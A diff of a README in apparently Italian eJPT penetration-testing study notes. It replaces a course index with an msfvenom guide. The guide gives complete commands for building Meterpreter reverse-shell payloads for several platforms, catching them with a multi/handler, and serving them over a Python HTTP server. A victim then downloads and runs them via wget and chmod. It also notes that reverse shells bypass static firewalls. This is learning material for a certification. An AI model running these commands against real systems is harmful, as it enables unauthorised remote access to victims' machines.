@@ -1,76 +1,65 @@
-# eJPT
+### Che cos’è?
 
-![Screenshot 2024-12-21 104842](https://github.com/user-attachments/assets/7530661d-b5f1-4a3c-a16c-5ba224b79131)
+E’ **un'utilità** a riga di comando usata per **generare e codificare** **payload MSF** **per** vari **sistemi** operativi e **server** web.
 
--[Information Gatering](https://github.com/emanueletroiani/eJPT/tree/Information-Gatering)
+Msfvenom è una **combinazione** di due utilità: **msfpayload** e **msfencode.**
 
--[Riassunto](https://github.com/emanueletroiani/eJPT/blob/Information-Gatering-riassunto/README.md)
+Possiamo utilizzare Msfvenom per **generare** un **payload meterpreter** dannoso che può essere **trasferito** a un sistema **client** di **destinazione**. **Una volta eseguito**, **si connetterà** nuovamente al nostro **gestore** di **payload** e ci **fornirà** **l'accesso remoto** al sistema di destinazione.
 
-Assessment Methodologies: Footprinting & Scanning
+- Questi payload possono essere di diversi tipi, come reverse shell, bind shell, meterpeter, ecc.
 
--[Networking Primer](https://github.com/emanueletroiani/eJPT/blob/Networking-Primer/README.md)
+### GENERARE PAYLOAD
 
--[Host Discovery](https://github.com/emanueletroiani/eJPT/blob/Host-Discovery-Techniques/README.md)
+MSFvenom può essere usato per creare payload in quasi tutti i formati, a seconda della configurazione del sistema di destinazione. In questi esempi, LHOST sarà l'indirizzo IP della macchina attaccante e LPORT sarà la porta su cui il gestore si metterà in ascolto. Formato Linux Executable and Linkable (elf):
 
--[Port Scanning](https://github.com/emanueletroiani/eJPT/blob/Port-Scanning/README.md)
+- **`msfvenom`** lista tutti i possibili comandi
+- **`msfvenom --list payloads`** lista tutti i payload che possiamo utilizzare
+- **`msfvenom --list formats`** lista i formati con cui possiamo generare payloads
+1. **`msfvenom -a x86/x64 -p SISTEMA TARGET/TIPO_SESSIONE_METERPRETER LHOST=MIO_IP LPORT=PORTA_IN_ASCOLTO -f FORMATO_SHELL > NOME_FILE.FORMATO_SELEZIONATO`**
+    - **-a** indicare i BIT del Sistema target se x64 o x86
+    - **-p** Indicare il Sistema target se Windows, Linux, Android etc e path sessione meterpreter
+    - **LHOST** inserire l’ip in ascolto (mio IP)
+    - **LPORT** inserire posta in ascolto
+    - **-f** scegliere il formato del peyload (solitamente .exe
+    - ESEMPIO: **msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.5 LPORT=1234 -f exe > backdoor.exe**
+2. **msfconsole`use exploit/multi/handler`** creato il payload e caricato sul target ci mettiamo in ascolto con la sessione meterpreter
+3. **`set payload PAYLOAD_UTILZZATO_X_MSFVENOM`** mettiamo lo stesso payload ES: **windows/meterpreter/reverse_tcp**
+    1. **LHOST** inserire l’ip in ascolto (mio IP)
+    2. **LPORT** inserire posta in ascolto
+4. Ora avviando payload nel target e riceveremo una sessione meterpreter
 
--[Riassunto comandi
-](https://github.com/emanueletroiani/eJPT/blob/Riassunto1/README.md)
+### CARICARE PAYLOAD CON UN SERVER TEMPORANEO IN PYTHON
 
-Assessment Methodologies: Enumeration
+1. **`python3 -m http.server PORTA`** avvia un server HTTP semplice e temporaneo utilizzando Python, con lo scopo di condividere **file dalla directory corrente** attraverso la rete.
+    - **-m http.server** modulo python integrato per creare un server in ascolto
+2. **Accesso ai file tramite dispositivo target**
+    - Se apri un browser dal dispositivo target vai su  `http://localhost:PORTA`  o `http://<MIO_IP>:PORTA`vedrai un elenco dei file nella directory.
+    - I file possono essere scaricati direttamente cliccando sui link.
 
--[FTP Enumeration](https://github.com/emanueletroiani/eJPT/blob/FTP-Enumeration/README.md)
+### Caricamento del payload sulla macchina vittima tramite SSH
 
--[SMB Enumeration](https://github.com/emanueletroiani/eJPT/blob/SMB-Enumeration/README.md)
+- **ssh username@targetIP**
+- **wget http://MIO_IP:porta/FILE_SHELL**
+- **chmod +x FILE_SHELL** Cambio di permessi sul payload
+- **./FILE_SHELL**  avviarlo nella sessione della vittima
 
--[Web Server Enumeration](https://github.com/emanueletroiani/eJPT/blob/Web-Server-Enumeration/README.md)
+### Esempi formato payload
 
--[MySQL Enumeration](https://github.com/emanueletroiani/eJPT/blob/MySQL-Enumeration/README.md)
+**elf** si sa per generare payload di un binario linux
 
--[SSH Enumeration](https://github.com/emanueletroiani/eJPT/blob/SSH-Enumeration/README.md)
+**dll** per file dll windows
 
--[SMTP Enumeration](https://github.com/emanueletroiani/eJPT/blob/SMTP-Enumeration/README.md)
+- Windows: **msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=XXXX -f exe > rev_shell.exe**
+- Linux**: msfvenom -a x86 -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf**
+- PHP: **msfvenom -a x64 -p php/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=XXXX -f raw > rev_shell.php**
+- ASP: **msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=XXXX -f asp > rev_shell.asp**
+- Python: **msfvenom -a x64 -p cmd/x64/meterpreter/reverse_python LHOST=10.10.x.x LPORT=XXXX -f raw > rev_shell.py**
 
--[Riassunto](https://github.com/emanueletroiani/eJPT/blob/Riassunto2/README.md)
+# Bind or Reverse
 
-Assessment Methodologies: Vulnerability Assessment
+- **bind_tcp:** in questa modalità si **inietta** un **processo** sulla **macchina obiettivo**. Questo processo si metterà in **ascolto** su una determinata **porta**, attendendo connessioni dall’esterno. Nella modalità bind_tcp il **servizio** di **shell** è **attivo** sulla **macchina attaccante** e la **connessione avviene dalla macchina dell’attaccante alla macchina target.**
+- **reverse_tcp**: in questa modalità si inietta un **processo** sulla macchina obiettivo, che questa volta **effettuerà dalla macchina target** **una connessione verso la macchina dell’attaccante** mettendo a disposizione una shell. **La differenza con il bind_tcp è che nel reverse_tcp è la macchina target che inizia la connessione verso la macchina dell’attaccante.**
 
--[Vulnerability Assessment](https://github.com/emanueletroiani/eJPT/blob/Vulnerability-Assessment/README.md)
+DIFFERENZA IN TERMINI DI FURTIVITA’
 
--[Vulnerability Analysis](https://github.com/emanueletroiani/eJPT/tree/Vulnerability-Analysis)
-
--[Vulnerability Scanning](https://github.com/emanueletroiani/eJPT/tree/Vulnerability-Scanning)
-
-Assessment Methodologies: Auditing Fundamentals
-
--[Introduction to Security Auditing](https://github.com/emanueletroiani/eJPT/blob/Introduction-to-Security-Auditing/README.md)
-
--[Governance, Risk & Compliance](https://github.com/emanueletroiani/eJPT/blob/Governance,-Risk-&-Compliance/README.md)
-
--From Auditing to Penetration Testing
-
-Host & Network Penetration Testing: System/Host Based Attacks
-
--[Windows Vulnerabilities](https://github.com/emanueletroiani/eJPT/blob/Windows-Vulnerabilities/README.md)
-
--[Exploiting Windows Vulnerabilities](https://github.com/emanueletroiani/eJPT/tree/Exploiting-Windows-Vulnerabilities)
-
--[Windows Privilege Escalation](https://github.com/emanueletroiani/eJPT/edit/Windows-Privilege-Escalation/README.md)
-
--[Windows File System Vulnerabilities](https://github.com/emanueletroiani/eJPT/blob/Alternate-Data-Streams/README.md)
-
--[Windows Credential Dumping](https://github.com/emanueletroiani/eJPT/tree/Windows-Credential-Dumping)
-
--[Exploiting Linux Vulnerabilities](https://github.com/emanueletroiani/eJPT/blob/Exploiting-Linux-Vulnerabilities/README.md)
-
--[Linux Privilege Escalation](https://github.com/emanueletroiani/eJPT/blob/Linux-Privilege-Escalation/README.md)
-
--[Linux Credential Dumping](https://github.com/emanueletroiani/eJPT/blob/Linux-Credential-Dumping/README.md)
-
-Host & Network Penetration Testing: Network-Based Attacks
-
--[SMB & NetBIOS Enumeration](https://github.com/emanueletroiani/eJPT/blob/SMB-&-NetBIOS-Enumeration/README.md)
-
--[SNMP Enumeration](https://github.com/emanueletroiani/eJPT/blob/SNMP-Enumeration/README.md)
-
--[SMB Relay Attack](https://github.com/emanueletroiani/eJPT/blob/SMB-Relay-Attack/README.md)
+Per bipassare i firewall statici si utilizza la reverse in quanto permette la fuoriuscita di dati dall’interno verso l’esterno. di conseguenza con la reverse abbiamo piu probabilità che l’attacco funzioni.
